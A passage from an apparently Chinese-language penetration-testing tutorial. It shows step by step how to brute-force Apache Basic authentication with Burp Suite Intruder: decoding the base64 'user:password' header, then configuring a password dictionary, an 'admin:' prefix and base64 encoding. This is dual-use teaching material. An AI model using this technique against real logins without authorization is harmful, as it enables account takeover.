![尝试取消登录查看返回状态码也是 401](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%B0%9D%E8%AF%95%E5%8F%96%E6%B6%88%E7%99%BB%E5%BD%95%E6%9F%A5%E7%9C%8B%E8%BF%94%E5%9B%9E%E7%8A%B6%E6%80%81%E7%A0%81%E4%B9%9F%E6%98%AF%20401.png)

### 4.5 实战-暴力破解 Apache BASIC 认证

打开拦截，提交用户名和任意密码

![打开拦截，提交用户名和任意密码](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E6%89%93%E5%BC%80%E6%8B%A6%E6%88%AA%EF%BC%8C%E6%8F%90%E4%BA%A4%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81.png)

> 可以看到提交的密码进行了 base64 编码

对这段编码进行解码

![对这段编码进行解码](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%AF%B9%E8%BF%99%E6%AE%B5%E7%BC%96%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81.png)

> admin:123
>
> 发现密码和用户名之间有一个 `:`

在 Intruder 中定位 payload 位置在 base64 编码

![在 Intruder 中定位 payload 位置在 base64 编码](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%9C%A8%20Intruder%20%E4%B8%AD%E5%AE%9A%E4%BD%8D%20payload%20%E4%BD%8D%E7%BD%AE%E5%9C%A8%20base64%20%E7%BC%96%E7%A0%81.png)

配置密码字典

![配置密码字典](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E9%85%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8.png)

在 Payload 处理中添加前缀

![在 Payload 处理中添加前缀](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%9C%A8%20Payload%20%E5%A4%84%E7%90%86%E4%B8%AD%E6%B7%BB%E5%8A%A0%E5%89%8D%E7%BC%80.png)

> admin:

添加对 payload 进行 base64 编码

![添加对 payload 进行 base64 编码](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E6%B7%BB%E5%8A%A0%E5%AF%B9%20payload%20%E8%BF%9B%E8%A1%8C%20base64%20%E7%BC%96%E7%A0%81.png)

> payload 处理顺序从上至下依次执行
>
> 记得取消 URL 编码

按照常规操作对目标进行攻击

![按照常规操作对目标进行攻击](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E6%8C%89%E7%85%A7%E5%B8%B8%E8%A7%84%E6%93%8D%E4%BD%9C%E5%AF%B9%E7%9B%AE%E6%A0%87%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB.png)

> 可以看到有一个不同的状态码为 `301` 即成功的 payload

可以添加平台认证，避免每次登录都需要登录 basic

![可以添加平台认证，避免每次登录都需要登录 basic](./../../../image/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9C%AA%E5%BD%92%E7%BA%B3/%E5%8F%AF%E4%BB%A5%E6%B7%BB%E5%8A%A0%E5%B9%B3%E5%8F%B0%E8%AE%A4%E8%AF%81%EF%BC%8C%E9%81%BF%E5%85%8D%E6%AF%8F%E6%AC%A1%E7%99%BB%E5%BD%95%E9%83%BD%E9%9C%80%E8%A6%81%E7%99%BB%E5%BD%95%20basic.png)

> 这样再次访问就不需要 basic 认证了
